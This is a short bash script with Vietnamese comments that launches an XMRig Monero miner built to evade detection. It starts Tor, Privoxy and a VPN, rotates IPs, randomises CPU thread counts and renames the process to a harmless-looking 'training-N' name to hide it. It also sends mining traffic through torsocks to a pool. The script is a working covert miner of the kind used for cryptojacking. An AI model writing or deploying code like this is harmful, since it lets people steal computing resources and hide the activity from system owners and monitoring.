#!/bin/bash

# Khởi động dịch vụ Tor, Privoxy và VPN
service tor start
service privoxy start
openvpn --config $VPN_CONFIG &

# Tạo bản sao của file xmrig nếu chưa có
if [ ! -f /root/work/xmrig_backup ]; then
  cp /root/work/xmrig /root/work/xmrig_backup
fi

# Kiểm tra và khởi động script đổi IP ngẫu nhiên
/root/change_ip.sh &

# Tính toán số threads dựa trên % CPU ngẫu nhiên
TOTAL_CORES=$(nproc)
cpu_hint=$(shuf -i $CPU_MIN-$CPU_MAX -n 1)
CPU_HINT=$(echo "($TOTAL_CORES * $cpu_hint) / 100" | bc)

# Đổi tên tiến trình để ẩn
RANDOM_PROCESS_NAME=$(echo training-$(shuf -i 1-999 -n 1))

# Khởi động XMRig với số lượng threads ngẫu nhiên
echo "Khởi động XMRig với $CPU_HINT threads..."
exec -a $RANDOM_PROCESS_NAME torsocks /root/work/$(cat /root/xmrig_name.txt) --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages --cpu-max-threads-hint=$CPU_HINT --tls --proxy=socks5://127.0.0.1:9050

# Giữ tiến trình chạy
tail -f /dev/null
